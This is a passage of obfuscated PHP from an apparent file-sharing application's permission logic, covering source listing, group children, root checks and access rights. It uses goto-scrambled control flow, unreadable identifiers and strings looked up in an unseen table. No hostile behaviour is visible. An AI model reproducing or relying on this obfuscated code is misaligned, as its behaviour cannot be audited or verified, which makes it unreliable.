($f˜è½¬³Íô[$a…¼º„îË¦[370]] != $a…¼º„îË¦[83]) { return $this->sourceListAuth(array($c’ôÙ‰Ëî›)); } goto bôèò’õîµ; B¾İÃ±˜ï…: return $this->sourceListAuth($dÚä¯¦¨×); goto bó†ƒ¹ÓµÙ; bó†ƒ¹ÓµÙ: } private function sourceListAuth($cîìÍÑê’) { goto d‚ÜãÕÖ—ë; B‡öÂÃÁß: $C†Ç—‡Èö = array(); foreach ($aó¼‹ñ‹× as $d¦§º„Ûó·) { goto B²Ñ‹Øé; cóÇ˜ÊÊ: $B·ŒÔò… â = count(explode($DÎí¢²ˆéµ[8], trim($d¦§º„Ûó·[$DÎí¢²ˆéµ[468]], $DÎí¢²ˆéµ[8]))); $C†Ç—‡Èö[] = $B·ŒÔò… â + ($d¦§º„Ûó·[$DÎí¢²ˆéµ[29]] == $DÎí¢²ˆéµ[76] ? 0 : 1000); goto aÅ¹†²ï¦Ö; bµÏ²î¯¿£: $d¦§º„Ûó·[$DÎí¢²ˆéµ[2293]] = $this->authTargetInfo($B›…œõ™ƒ); $d¦§º„Ûó·[$DÎí¢²ˆéµ[468]] = rtrim($d¦§º„Ûó·[$DÎí¢²ˆéµ[464]], $DÎí¢²ˆéµ[8]) . $DÎí¢²ˆéµ[8] . ltrim($d¦§º„Ûó·[$DÎí¢²ˆéµ[468]], $DÎí¢²ˆéµ[8]); $dÄ…µãÏÃÛ[] = $d¦§º„Ûó·; goto cóÇ˜ÊÊ; AÆ’ÛŸÖÁô: unset($d¦§º„Ûó·[$DÎí¢²ˆéµ[391]]); $B›…œõ™ƒ = $aê‹ßÅ´Óæ[$d¦§º„Ûó·[$DÎí¢²ˆéµ[369]]]; if (!$B›…œõ™ƒ) { continue; } goto bµÏ²î¯¿£; B²Ñ‹Øé: unset($d¦§º„Ûó·[$DÎí¢²ˆéµ[379]]); unset($d¦§º„Ûó·[$DÎí¢²ˆéµ[378]]); unset($d¦§º„Ûó·[$DÎí¢²ˆéµ[376]]); goto AÆ’ÛŸÖÁô; aÅ¹†²ï¦Ö: } array_multisort($C†Ç—‡Èö, SORT_ASC, $dÄ…µãÏÃÛ); goto aèğÑ¦¦‹; d‚ÜãÕÖ—ë: $DÎí¢²ˆéµ =& $_SERVER[ã®Â„Éæ¹¤]; $aó¼‹ñ‹× = Model($DÎí¢²ˆéµ[1136])->sourceListInfo($cîìÍÑê’, !0); $CÓé˜‡ìŒ = $DÎí¢²ˆéµ[2289]; goto CÕ¨‡·Œœ; aèğÑ¦¦‹: return $dÄ…µãÏÃÛ; goto E±äö§ÒÏ; CÕ¨‡·Œœ: $CÁÈÊ‡ô¢İ = $this->field($CÓé˜‡ìŒ)->where(array($DÎí¢²ˆéµ[369] => array($DÎí¢²ˆéµ[7], $cîìÍÑê’)))->select(); $aê‹ßÅ´Óæ = array_to_keyvalue_group($CÁÈÊ‡ô¢İ, $DÎí¢²ˆéµ[369]); $dÄ…µãÏÃÛ = array(); goto B‡öÂÃÁß; E±äö§ÒÏ: } private function groupChidldAllRootSource($aÂ©×¦İºŠ) { $fŒµ¾×‘äØ =& $_SERVER[ã®Â„Éæ¹¤]; $CéÌ˜Âï˜ù = Model($fŒµ¾×‘äØ[2294])->groupChildrenAll($aÂ©×¦İºŠ); $A®àÆçâÌ‡ = array($fŒµ¾×‘äØ[463] => 0, $fŒµ¾×‘äØ[458] => array($fŒµ¾×‘äØ[7], $CéÌ˜Âï˜ù), $fŒµ¾×‘äØ[371] => SourceModel::TYPE_GROUP); $B¡Ôèˆ‚‘ = Model($fŒµ¾×‘äØ[775])->field($fŒµ¾×‘äØ[369])->where($A®àÆçâÌ‡)->select(); $B¡Ôèˆ‚‘ = array_to_keyvalue($B¡Ôèˆ‚‘, $fŒµ¾×‘äØ[33], $fŒµ¾×‘äØ[369]); return $B¡Ôèˆ‚‘; } private function authTargetInfo($F¶­çÒØº) { goto EÒŒñ ËÑÀ; EÒŒñ ËÑÀ: $eô×ª‚¸¸ =& $_SERVER[ã®Â„Éæ¹¤]; $A¾åÌœÙ‡ß = array(); $B¾ÑÔÙ†¥ï = array(); goto EØà¤…ÀÃ˜; EØà¤…ÀÃ˜: $féÙ¯À’òø = 2 << 25; foreach ($F¶­çÒØº as $e¼Œ¾é¸ø) { goto bãå«ëÑÛ; A½¸ï’„’™: if (!$f¤ì¹™è) { continue; } $f¤ì¹™è[$eô×ª‚¸¸[418]] = $c°ˆùšŒ—š; $A¾åÌœÙ‡ß[] = $f¤ì¹™è; goto F¬ŠÎÂàÇÉ; dÏˆÓÖ¶Š: if ($e¼Œ¾é¸ø[$eô×ª‚¸¸[371]] == SourceModel::TYPE_USER && $e¼Œ¾é¸ø[$eô×ª‚¸¸[458]] == $eô×ª‚¸¸[470]) { $B‹óøì«Ñº = 0; } $B¾ÑÔÙ†¥ï[] = $c°ˆùšŒ—š[$eô×ª‚¸¸[376]] + $B‹óøì«Ñº; goto a÷ÕÉ×ìÃŸ; bãå«ëÑÛ: $c°ˆùšŒ—š = Model($eô×ª‚¸¸[2290])->listData($e¼Œ¾é¸ø[$eô×ª‚¸¸[2271]]); if (!$c°ˆùšŒ—š) { continue; } if ($e¼Œ¾é¸ø[$eô×ª‚¸¸[371]] == SourceModel::TYPE_USER) { $f¤ì¹™è = Model($eô×ª‚¸¸[476])->getInfoSimpleOuter($e¼Œ¾é¸ø[$eô×ª‚¸¸[458]]); if ($f¤ì¹™è[$eô×ª‚¸¸[1456]] == $eô×ª‚¸¸[1050]) { continue; } if ($f¤ì¹™è[$eô×ª‚¸¸[1456]] == $eô×ª‚¸¸[470]) { $f¤ì¹™è[$eô×ª‚¸¸[28]] = LNG($eô×ª‚¸¸[2295]); } } else { $f¤ì¹™è = Model($eô×ª‚¸¸[460])->getInfoSimple($e¼Œ¾é¸ø[$eô×ª‚¸¸[458]]); } goto A½¸ï’„’™; F¬ŠÎÂàÇÉ: $B‹óøì«Ñº = 0; if ($e¼Œ¾é¸ø[$eô×ª‚¸¸[371]] == SourceModel::TYPE_GROUP) { $B‹óøì«Ñº = $féÙ¯À’òø * 2; } if ($e¼Œ¾é¸ø[$eô×ª‚¸¸[371]] == SourceModel::TYPE_USER) { $B‹óøì«Ñº = $féÙ¯À’òø; } goto dÏˆÓÖ¶Š; a÷ÕÉ×ìÃŸ: } array_multisort($B¾ÑÔÙ†¥ï, SORT_DESC, $A¾åÌœÙ‡ß); goto A©ƒ±œÅÉ…; A©ƒ±œÅÉ…: return $A¾åÌœÙ‡ß; goto EÉòààÁ‰Ñ; EÉòààÁ‰Ñ: } public function getAllChildrenByUser($aĞøÁÑéÍ®, $Eğ…ÊÏÈˆ) { goto FĞÄÏˆÂ; aŠ…¿İØÁ: $C¶ï†ïÛƒ¤ = Model($b–™—§…¸‰[1136])->sourceInfo($aĞøÁÑéÍ®); $a«İÈ¾¨Üº = array(); $eøìôØ«ÀË = 1; goto C´©¥éèÃ‘; C´©¥éèÃ‘: if ($C¶ï†ïÛƒ¤[$b–™—§…¸‰[463]] == $b–™—§…¸‰[470] && $C¶ï†ïÛƒ¤[$b–™—§…¸‰[458]] != $eøìôØ«ÀË && $this->groupContainUser($C¶ï†ïÛƒ¤[$b–™—§…¸‰[458]], $Eğ…ÊÏÈˆ)) { foreach ($aŞ––Ôåï¤[$b–™—§…¸‰[2296]] as $D¼ìÑç¥¶›) { $a¾Şï¬µ = Model($b–™—§…¸‰[460])->getInfo($D¼ìÑç¥¶›[$b–™—§…¸‰[2127]]); $Aêà£¹·ì‚ = Model($b–™—§…¸‰[479])->getInfoSimpleOuter($Eğ…ÊÏÈˆ); $Aêà£¹·ì‚[$b–™—§…¸‰[418]] = $D¼ìÑç¥¶›[$b–™—§…¸‰[376]]; if (Model($b–™—§…¸‰[2290])->authCheckAction($D¼ìÑç¥¶›[$b–™—§…¸‰[376]][$b–™—§…¸‰[376]], $b–™—§…¸‰[1582])) { continue; } $c÷ÍÃŒØÅˆ = array($b–™—§…¸‰[28] => $b–™—§…¸‰[1409] . $a¾Şï¬µ[$b–™—§…¸‰[28]], $b–™—§…¸‰[369] => $a¾Şï¬µ[$b–™—§…¸‰[391]][$b–™—§…¸‰[369]], $b–™—§…¸‰[75] => KodIO::make($a¾Şï¬µ[$b–™—§…¸‰[391]][$b–™—§…¸‰[369]]), $b–™—§…¸‰[463] => $b–™—§…¸‰[470], $b–™—§…¸‰[371] => $b–™—§…¸‰[989], $b–™—§…¸‰[29] => $b–™—§…¸‰[490], $b–™—§…¸‰[468] => $a¾Şï¬µ[$b–™—§…¸‰[465]], $b–™—§…¸‰[2127] => $a¾Şï¬µ[$b–™—§…¸‰[2127]], $b–™—§…¸‰[462] => $a¾Şï¬µ[$b–™—§…¸‰[463]], $b–™—§…¸‰[2293] => array($Aêà£¹·ì‚)); $a«İÈ¾¨Üº[$c÷ÍÃŒØÅˆ[$b–™—§…¸‰[369]]] = $c÷ÍÃŒØÅˆ; } } $B¨…¤êí¬ğ = array(); $FÖ¥¤íáºÎ = $this->getAllChildren($aĞøÁÑéÍ®); goto c²Ü…ãòÑº; FĞÄÏˆÂ: $b–™—§…¸‰ =& $_SERVER[ã®Â„Éæ¹¤]; $aŞ––Ôåï¤ = Model($b–™—§…¸‰[479])->getInfo($Eğ…ÊÏÈˆ); if (!$Eğ…ÊÏÈˆ || !$aĞøÁÑéÍ® || !$aŞ––Ôåï¤) { return array(); } goto aŠ…¿İØÁ; c²Ü…ãòÑº: foreach ($FÖ¥¤íáºÎ as $F‘Ä÷…êÒ) { $FÑµÒğ¬„¼ = !1; foreach ($F‘Ä÷…êÒ[$b–™—§…¸‰[2293]] as $câŒç”ÈËÂ) { if ($câŒç”ÈËÂ[$b–™—§…¸‰[1456]]) { if ($câŒç”ÈËÂ[$b–™—§…¸‰[1456]] == $Eğ…ÊÏÈˆ) { $FÑµÒğ¬„¼ = !0; break; } } if ($câŒç”ÈËÂ[$b–™—§…¸‰[2127]]) { if ($this->groupContainUser($câŒç”ÈËÂ[$b–™—§…¸‰[2127]], $Eğ…ÊÏÈˆ)) { $FÑµÒğ¬„¼ = !0; break; } } } if ($FÑµÒğ¬„¼) { $B¨…¤êí¬ğ[] = $F‘Ä÷…êÒ; } $F¸ôª˜ÅŠ– = $F‘Ä÷…êÒ[$b–™—§…¸‰[369]]; if (isset($a«İÈ¾¨Üº[$F¸ôª˜ÅŠ–])) { $F‘Ä÷…êÒ[$b–™—§…¸‰[2293]][] = $a«İÈ¾¨Üº[$F¸ôª˜ÅŠ–][0]; $a«İÈ¾¨Üº[$F¸ôª˜ÅŠ–] = !1; } } $a«İÈ¾¨Üº = array_filter(array_values($a«İÈ¾¨Üº)); $B¨…¤êí¬ğ = array_merge($a«İÈ¾¨Üº, $B¨…¤êí¬ğ); goto aˆİè¾–; aˆİè¾–: return $B¨…¤êí¬ğ; goto AÙ‘å½ÉÁŠ; AÙ‘å½ÉÁŠ: } public function setAllChildrenByUser($f²Ó«øÂ“, $bë“¸£¸î, $aªÖ«†óªÓ) { $Eù«®È†ßŠ =& $_SERVER[ã®Â„Éæ¹¤]; $F¥íà¼ºš = $this->getAllChildrenByUser($f²Ó«øÂ“, $bë“¸£¸î); if (!$aªÖ«†óªÓ || !$F¥íà¼ºš) { return !1; } foreach ($F¥íà¼ºš as $cã˜ç´Ş) { $a»‹¨ÒªĞÀ = array(); foreach ($cã˜ç´Ş[$Eù«®È†ßŠ[2293]] as $cÚÅ±·˜¶†) { $câÅäÊå÷ = $cÚÅ±·˜¶†[$Eù«®È†ßŠ[418]]; $B˜ê£¡ß‘¿ = $cÚÅ±·˜¶†[$Eù«®È†ßŠ[1456]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $eŒÌ‰åÕ” = $cÚÅ±·˜¶†[$Eù«®È†ßŠ[1456]] ? $cÚÅ±·˜¶†[$Eù«®È†ßŠ[1456]] : $cÚÅ±·˜¶†[$Eù«®È†ßŠ[2127]]; if ($cÚÅ±·˜¶†[$Eù«®È†ßŠ[1456]] && $cÚÅ±·˜¶†[$Eù«®È†ßŠ[1456]] == $bë“¸£¸î) { continue; } $a»‹¨ÒªĞÀ[] = array($Eù«®È†ßŠ[369] => $cã˜ç´Ş[$Eù«®È†ßŠ[369]], $Eù«®È†ßŠ[371] => $B˜ê£¡ß‘¿, $Eù«®È†ßŠ[458] => intval($eŒÌ‰åÕ”), $Eù«®È†ßŠ[2271] => isset($câÅäÊå÷[$Eù«®È†ßŠ[367]]) ? intval($câÅäÊå÷[$Eù«®È†ßŠ[367]]) : 0, $Eù«®È†ßŠ[2272] => isset($câÅäÊå÷[$Eù«®È†ßŠ[2272]]) ? intval($câÅäÊå÷[$Eù«®È†ßŠ[2272]]) : -1); } $a»‹¨ÒªĞÀ[] = array($Eù«®È†ßŠ[369] => $cã˜ç´Ş[$Eù«®È†ßŠ[369]], $Eù«®È†ßŠ[371] => SourceModel::TYPE_USER, $Eù«®È†ßŠ[458] => intval($bë“¸£¸î), $Eù«®È†ßŠ[2271] => intval($aªÖ«†óªÓ), $Eù«®È†ßŠ[2272] => -1); $this->where(array($Eù«®È†ßŠ[383] => $cã˜ç´Ş[$Eù«®È†ßŠ[369]]))->delete(); $this->addAll($a»‹¨ÒªĞÀ); } return !0; } public function get($dâÎ¡ğŠ³) { $eñÊµ‘Œââ = $this->getSourceList(array($dâÎ¡ğŠ³), !0); return $eñÊµ‘Œââ[0]; } public function getSourceList($aòíßŠ¾™, $c¸¹ÂŒ‰ŒÍ = false, $a¬ÅÁìˆç‡ = false) { goto F¿Ç¤¥ŠÁÄ; fì§©Ôí÷: $D³ò÷¸Œø = array(); foreach ($c¸¹ÂŒ‰ŒÍ as $d“ÌßİëÜù => $DÒ†“œ¨») { if ($Eéàô°Ë) { $D³ò÷¸Œø[$d“ÌßİëÜù] = $B·Ó¼¸‘Ò; continue; } $D³ò÷¸Œø[$d“ÌßİëÜù] = $this->makeSourceAuth($DÒ†“œ¨», $EçØê°—²é, $a¬ÅÁìˆç‡); } return $D³ò÷¸Œø; goto bÁÅŠàİù; B¬‘›Æ‰Öó: foreach ($c¸¹ÂŒ‰ŒÍ as $dÛ³—Š£ => $a¶ÓÀß¦–‘) { $DíÈ†Ï¸¬’ = $dÒÊŸè™¦Ù->parentLevelArray($a¶ÓÀß¦–‘[$bÆìÕ½íËï[461]]); $F¬ø¾ã¨ø¶ = array_merge($F¬ø¾ã¨ø¶, array($dÛ³—Š£), array_reverse($DíÈ†Ï¸¬’)); } $F¬ø¾ã¨ø¶ = array_values(array_unique($F¬ø¾ã¨ø¶)); if (!$F¬ø¾ã¨ø¶) { return array(); } goto CößÜ™ÑÕ; CößÜ™ÑÕ: $bã’ÕÙ²Íç = $bÆìÕ½íËï[2298]; $fáÖñ´ŠÅà = array($bÆìÕ½íËï[383] => array($bÆìÕ½íËï[384], $F¬ø¾ã¨ø¶)); $d¢º‰Ã‰  = $this->field($bã’ÕÙ²Íç)->where($fáÖñ´ŠÅà)->select(); goto F¬ÑŒÖÒÙ“; Bà†è«‰ : $Eéàô°Ë = $this->userIsRoot($a¬ÅÁìˆç‡); $B÷÷ë¹®‚ = AuthModel::authAll(); $B·Ó¼¸‘Ò = array($bÆìÕ½íËï[377] => $B÷÷ë¹®‚, $bÆìÕ½íËï[2299] => array($bÆìÕ½íËï[385] => 0, $bÆìÕ½íËï[2133] => $B÷÷ë¹®‚, $bÆìÕ½íËï[386] => LNG($bÆìÕ½íËï[2300]), $bÆìÕ½íËï[2147] => $bÆìÕ½íËï[2301])); goto fì§©Ôí÷; F¿Ç¤¥ŠÁÄ: $bÆìÕ½íËï =& $_SERVER[ã®Â„Éæ¹¤]; if (!$aòíßŠ¾™) { return array(); } $dÒÊŸè™¦Ù = Model($bÆìÕ½íËï[1136]); goto EòÑ¬ù–ßæ; EòÑ¬ù–ßæ: if (!$c¸¹ÂŒ‰ŒÍ && count($aòíßŠ¾™) == 1) { $c¸¹ÂŒ‰ŒÍ = array(); $c¸¹ÂŒ‰ŒÍ[$aòíßŠ¾™[0]] = $dÒÊŸè™¦Ù->sourceInfo($aòíßŠ¾™[0]); } if (!$c¸¹ÂŒ‰ŒÍ) { $fáÖñ´ŠÅà = array($bÆìÕ½íËï[383] => array($bÆìÕ½íËï[384], $aòíßŠ¾™)); $c¸¹ÂŒ‰ŒÍ = $dÒÊŸè™¦Ù->field($bÆìÕ½íËï[2297])->where($fáÖñ´ŠÅà)->select(); $c¸¹ÂŒ‰ŒÍ = array_to_keyvalue($c¸¹ÂŒ‰ŒÍ, $bÆìÕ½íËï[369]); } $F¬ø¾ã¨ø¶ = $aòíßŠ¾™; goto B¬‘›Æ‰Öó; F¬ÑŒÖÒÙ“: $d¢º‰Ã‰  = array_to_keyvalue_group($d¢º‰Ã‰ , $bÆìÕ½íËï[369]); $EçØê°—²é = array(); foreach ($F¬ø¾ã¨ø¶ as $d“ÌßİëÜù) { if (isset($d¢º‰Ã‰ [$d“ÌßİëÜù])) { $EçØê°—²é[$d“ÌßİëÜù] = $d¢º‰Ã‰ [$d“ÌßİëÜù]; } } goto Bà†è«‰ ; bÁÅŠàİù: } public function authDeepCheck($b á½¶‹, $bì¦—¿Ù = false) { goto aÖ§·™³Â; aÖ§·™³Â: $c•í©éƒ—˜ =& $_SERVER[ã®Â„Éæ¹¤]; $bì¦—¿Ù = $bì¦—¿Ù ? $bì¦—¿Ù : USER_ID; $b­öÜ‰´‚§ = $this->makeAuthDeep($bì¦—¿Ù); goto cê„ºÒæ¾; cê„ºÒæ¾: if (!in_array($b á½¶‹, $b­öÜ‰´‚§[$c•í©éƒ—˜[2302]])) { return !1; } $cİµœç†Ø = array(); foreach ($b­öÜ‰´‚§[$c•í©éƒ—˜[2303]] as $FŒ¿²¢À©Ü => $aâñÌîÀ–Ò) { if (!in_array($b á½¶‹, $aâñÌîÀ–Ò)) { continue; } $cİµœç†Ø[] = $FŒ¿²¢À©Ü; } goto B¸¥‹ˆÕ©í; B¸¥‹ˆÕ©í: $cˆÜÖ¼¨Øà = $cİµœç†Ø ? $cİµœç†Ø[0] : $b á½¶‹; return array($c•í©éƒ—˜[377] => -1, $c•í©éƒ—˜[418] => array($c•í©éƒ—˜[385] => $c•í©éƒ—˜[1050], $c•í©éƒ—˜[2133] => $c•í©éƒ—˜[470], $c•í©éƒ—˜[386] => LNG($c•í©éƒ—˜[2304]), $c•í©éƒ—˜[2147] => $c•í©éƒ—˜[2305]), $c•í©éƒ—˜[2306] => LNG($c•í©éƒ—˜[2307]), $c•í©éƒ—˜[2308] => $this->sourceAuthInfo($cˆÜÖ¼¨Øà)); goto E¾±ù‘½Ş; E¾±ù‘½Ş: } protected function makeAuthDeep($bãì§ª»¯ = false) { goto fî¼¤éáÊ‡; E¾§·‡À›¡: if ($EÓÎÌ¶Í»ò) { $bÏÆÊˆë´š = $C‡ÖÚâ•Ä®->where(array($e¤ÕÃ¿‰É[369] => array($e¤ÕÃ¿‰É[384], $EÓÎÌ¶Í»ò)))->select(); foreach ($bÏÆÊˆë´š as $cƒ¨ù‹„ˆÍ) { $F½áÀ½ñÅ = $C‡ÖÚâ•Ä®->parentLevelArray($cƒ¨ù‹„ˆÍ[$e¤ÕÃ¿‰É[461]]); $F©¯’İæšÜ = array_merge($F©¯’İæšÜ, $F½áÀ½ñÅ); $BöÊßÛá‡[] = $cƒ¨ù‹„ˆÍ[$e¤ÕÃ¿‰É[458]]; $e¸³ÓóñÎ[$cƒ¨ù‹„ˆÍ[$e¤ÕÃ¿‰É[369]]] = $F½áÀ½ñÅ; $d§„•“›Î[$cƒ¨ù‹„ˆÍ[$e¤ÕÃ¿‰É[369]]] = $cƒ¨ù‹„ˆÍ[$e¤ÕÃ¿‰É[458]]; } } $BöÊßÛá‡ = array_values(array_unique($BöÊßÛá‡)); $c¦±ë„ìï‘ = $BöÊßÛá‡; goto E”éàö´¥; A¬ÁÓó¸Ë: foreach ($c¤ŸœÄĞ½Â as $Dè¯»¯–Ò•) { if ($Dè¯»¯–Ò•[$e¤ÕÃ¿‰É[376]] == 0 && $Dè¯»¯–Ò•[$e¤ÕÃ¿‰É[2148]] == $e¤ÕÃ¿‰É[83]) { $cÀ…âä‚Í«[] = $Dè¯»¯–Ò•[$e¤ÕÃ¿‰É[367]]; } } $dª¡‹åĞš = $this->userGroupParents($bãì§ª»¯); $f¸½ò—İ = array($e¤ÕÃ¿‰É[371] => SourceModel::TYPE_USER, $e¤ÕÃ¿‰É[458] => $bãì§ª»¯); goto b‡äù¡¸ôœ; Añ¸Í…‘ó: $d§„•“›Î = array(); $aª©ÀÏÍÒó = array(); $Bñöà–íå = array(); goto E¾§·‡À›¡; c·§ˆªîŒ: if (isset($DÚµ“¨Ôëå[$bãì§ª»¯])) { return $DÚµ“¨Ôëå[$bãì§ª»¯]; } $c¤ŸœÄĞ½Â = Model($e¤ÕÃ¿‰É[2309])->listData(); $cÀ…âä‚Í« = array(); goto A¬ÁÓó¸Ë; DŸÌ¿ªÂŠæ: $EÓÎÌ¶Í»ò = array_to_keyvalue($DØ‡Ä”©óº, $e¤ÕÃ¿‰É[33], $e¤ÕÃ¿‰É[369]); $F©¯’İæšÜ = array(); $BöÊßÛá‡ = $dª¡‹åĞš; goto EªÏ“½ö›Ë; EªÏ“½ö›Ë: $C‡ÖÚâ•Ä® = Model($e¤ÕÃ¿‰É[1136]); $F¢›ó½’š† = Model($e¤ÕÃ¿‰É[460]); $e¸³ÓóñÎ = array(); goto Añ¸Í…‘ó; fî¼¤éáÊ‡: $e¤ÕÃ¿‰É =& $_SERVER[ã®Â„Éæ¹¤]; static $DÚµ“¨Ôëå = array(); $bãì§ª»¯ = $bãì§ª»¯ ? $bãì§ª»¯ : USER_ID; goto c·§ˆªîŒ; b‡äù¡¸ôœ: if ($dª¡‹åĞš) { $f¸½ò—İ = array(array($e¤ÕÃ¿‰É[371] => SourceModel::TYPE_USER, $e¤ÕÃ¿‰É[458] => $bãì§ª»¯), array($e¤ÕÃ¿‰É[371] => SourceModel::TYPE_GROUP, $e¤ÕÃ¿‰É[458] => array($e¤ÕÃ¿‰É[384], $dª¡‹åĞš)), $e¤ÕÃ¿‰É[932] => $e¤ÕÃ¿‰É[2212]); } if ($cÀ…âä‚Í«) { $f¸½ò—İ = array($f¸½ò—İ, $e¤ÕÃ¿‰É[2271] => array($e¤ÕÃ¿‰É[2310], $cÀ…âä‚Í«)); } $DØ‡Ä”©óº = $this->field($e¤ÕÃ¿‰É[2311])->where($f¸½ò—İ)->select(); goto DŸÌ¿ªÂŠæ; Eê¤øÌ‰êö: $DÚµ“¨Ôëå[$bãì§ª»¯] = $eË¾Ü‘çÖ; return $eË¾Ü‘çÖ; goto B¤ã¤»†‚Ó; dˆİŠÕ»Ã: foreach ($e¸³ÓóñÎ as $bğÉ»‹á => $cæÇ×Ş‹–œ) { $eòôö¹®¨¥ = $d§„•“›Î[$bğÉ»‹á]; if (!$eòôö¹®¨¥ || !$aª©ÀÏÍÒó[$eòôö¹®¨¥]) { continue; } $CäŒŒï¸‚¦ = array(); foreach ($Bñöà–íå[$eòôö¹®¨¥] as $d½¾Î¼›Ì) { $CäŒŒï¸‚¦[] = $aª©ÀÏÍÒó[$d½¾Î¼›Ì]; } $e¸³ÓóñÎ[$bğÉ»‹á] = array_merge($CäŒŒï¸‚¦, $cæÇ×Ş‹–œ); } $F©¯’İæšÜ = array_values(array_unique($F©¯’İæšÜ)); $eË¾Ü‘çÖ = array($e¤ÕÃ¿‰É[2302] => $F©¯’İæšÜ, $e¤ÕÃ¿‰É[2303] => $e¸³ÓóñÎ); goto Eê¤øÌ‰êö; E”éàö´¥: foreach ($c¦±ë„ìï‘ as $d½¾Î¼›Ì) { $aÒ”±¾Ÿãï = $F¢›ó½’š†->getInfo($d½¾Î¼›Ì); $F½áÀ½ñÅ = $C‡ÖÚâ•Ä®->parentLevelArray($aÒ”±¾Ÿãï[$e¤ÕÃ¿‰É[461]]); $BöÊßÛá‡ = array_merge($BöÊßÛá‡, $F½áÀ½ñÅ); } $BöÊßÛá‡ = array_values(array_unique($BöÊßÛá‡)); foreach ($BöÊßÛá‡ as $d½¾Î¼›Ì) { $aÒ”±¾Ÿãï = $F¢›ó½’š†->getInfo($d½¾Î¼›Ì); $F©¯’İæšÜ[] = $aÒ”±¾Ÿãï[$e¤ÕÃ¿‰É[391]][$e¤ÕÃ¿‰É[369]]; $aª©ÀÏÍÒó[$d½¾Î¼›Ì] = $aÒ”±¾Ÿãï[$e¤ÕÃ¿‰É[391]][$e¤ÕÃ¿‰É[369]]; $Bñöà–íå[$d½¾Î¼›Ì] = $C‡ÖÚâ•Ä®->parentLevelArray($aÒ”±¾Ÿãï[$e¤ÕÃ¿‰É[461]]); } goto dˆİŠÕ»Ã; B¤ã¤»†‚Ó: } private function makeSourceAuth($Bì²©’¼Å, $fˆğ‰äÔ‚¼, $AŠ†©íÒâ = false) { goto CŠ”—éøã; f»Ëí±ä‰•: if (!$aÇø‰Ë‡®) { $BÔ®áÈ±ÛÈ = Model($FÕŒ‰­›“[460])->getInfo($cù£ÊéÏ¹‡); $EÓß®™Ğ = explode($FÕŒ‰­›“[47], trim($BÔ®áÈ±ÛÈ[$FÕŒ‰­›“[461]], $FÕŒ‰­›“[47])); foreach ($EÓß®™Ğ as $d‰İ¬ä„ƒË) { if ($d‰İ¬ä„ƒË == $FÕŒ‰­›“[470] || $d‰İ¬ä„ƒË == $a©äãª¬’ß) { continue; } $C¶ëæ¢›½• = $this->groupRootAuth($d‰İ¬ä„ƒË, $AŠ†©íÒâ); if (!$C¶ëæ¢›½•) { continue; } $aÇø‰Ë‡® = $this->groupAuthInfo($C¶ëæ¢›½•, $d‰İ¬ä„ƒË); break; } } if (!$aÇø‰Ë‡® || $aÇø‰Ë‡®[$FÕŒ‰­›“[377]] <= 0) { $Aò’ô¾ˆµ‚ = $this->authDeepCheck($Bì²©’¼Å[$FÕŒ‰­›“[369]], $AŠ†©íÒâ); if ($Aò’ô¾ˆµ‚) { $aÇø‰Ë‡® = $Aò’ô¾ˆµ‚; } } return $aÇø‰Ë‡®; goto fëõÛŠÀ”; CÒˆšß¸¼¼: foreach ($F¨Ø’°¸ÌË as $C‘Ç’ÃÂ¥‚) { if (!isset($fˆğ‰äÔ‚¼[$C‘Ç’ÃÂ¥‚])) { continue; } $f›İŸ«ÇÖ = $this->authMake($fˆğ‰äÔ‚¼[$C‘Ç’ÃÂ¥‚], $AŠ†©íÒâ); if ($f›İŸ«ÇÖ[$FÕŒ‰­›“[418]]) { $aÇø‰Ë‡® = $f›İŸ«ÇÖ; break; } } if (!$dé²Ö“ˆÛì) { return $aÇø‰Ë‡®; } if (!$aÇø‰Ë‡® && $D‘˜ÑàÔš) { $aÇø‰Ë‡® = $this->groupAuthInfo($D‘˜ÑàÔš, $cù£ÊéÏ¹‡); } goto f»Ëí±ä‰•; d×¥ šíô¼: $dé²Ö“ˆÛì = $Bì²©’¼Å[$FÕŒ‰­›“[371]] == SourceModel::TYPE_GROUP; $D‘˜ÑàÔš = $dé²Ö“ˆÛì ? $this->groupRootAuth($cù£ÊéÏ¹‡, $AŠ†©íÒâ) : !1; if ($D‘˜ÑàÔš && Model($FÕŒ‰­›“[2290])->authCheckAction($D‘˜ÑàÔš[$FÕŒ‰­›“[376]], $FÕŒ‰­›“[1582])) { return $this->groupAuthInfo($D‘˜ÑàÔš, $cù£ÊéÏ¹‡); } goto fê»ÊáùÓÈ; CŠ”—éøã: $FÕŒ‰­›“ =& $_SERVER[ã®Â„Éæ¹¤]; $a©äãª¬’ß = $FÕŒ‰­›“[83]; $cù£ÊéÏ¹‡ = $Bì²©’¼Å[$FÕŒ‰­›“[458]]; goto d×¥ šíô¼; fê»ÊáùÓÈ: $F¨Ø’°¸ÌË = Model($FÕŒ‰­›“[1136])->parentLevelArray($Bì²©’¼Å[$FÕŒ‰­›“[461]]); $F¨Ø’°¸ÌË = array_merge(array($Bì²©’¼Å[$FÕŒ‰­›“[369]]), array_reverse($F¨Ø’°¸ÌË)); $aÇø‰Ë‡® = !1; goto CÒˆšß¸¼¼; fëõÛŠÀ”: } private function userIsRoot($dˆê¼ÔÃ®¸ = false) { $CÒ×âÒÔĞõ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$dˆê¼ÔÃ®¸ && _get($GLOBALS, $CÒ×âÒÔĞõ[459])) { return !0; } $EÌŠ„ÎÌ¿× = Model($CÒ×âÒÔĞõ[479])->getInfo($dˆê¼ÔÃ®¸); $cÅôÑÉóº¸ = Model($CÒ×âÒÔĞõ[2312])->listData($EÌŠ„ÎÌ¿×[$CÒ×âÒÔĞõ[1341]]); if ($cÅôÑÉóº¸ && $cÅôÑÉóº¸[$CÒ×âÒÔĞõ[1210]][$CÒ×âÒÔĞõ[2313]] == 1) { return !0; } return !1; } private function sourceAuthInfo($e©¥‹æ…¤) { goto F‰•Åï»¹ğ; F‰•Åï»¹ğ: $Aµó§ö×à =& $_SERVER[ã®Â„Éæ¹¤]; $CŞà·‚ÏÔğ = Model($Aµó§ö×à[1136]); $c’ò÷‡Ï‰» = $CŞà·‚ÏÔğ->sourceInfo($e©¥‹æ…¤); goto cŸï×ªŠï; Bç‰¸ñ±î: $D™“ä¡á = $CŞà·‚ÏÔğ->_listAppendPath($D™“ä¡á); $c’ò÷‡Ï‰» = $D™“ä¡á[0]; $däÔ‹ã°Å© = $c’ò÷‡Ï‰»[$Aµó§ö×à[468]]; goto B¾µºÅã•¯; cŸï×ªŠï: if (!$c’ò÷‡Ï‰») { return !1; } $CŞà·‚ÏÔğ->groupPathDisplay($c’ò÷‡Ï‰»); $D™“ä¡á = array($c’ò÷‡Ï‰»); goto Bç‰¸ñ±î; 